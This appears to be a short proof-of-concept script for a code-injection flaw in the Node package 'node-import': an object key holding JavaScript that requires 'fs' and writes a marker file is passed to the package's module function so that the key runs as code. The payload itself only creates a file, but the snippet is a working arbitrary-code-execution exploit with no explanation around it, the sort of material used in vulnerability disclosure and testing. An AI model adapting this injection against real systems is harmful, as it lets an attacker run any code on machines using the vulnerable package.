var a = require("node-import");
var params = {
  'fs=require("fs");fs.writeFileSync("JHU", "2333");//':123
}
a.module('x',params,true)
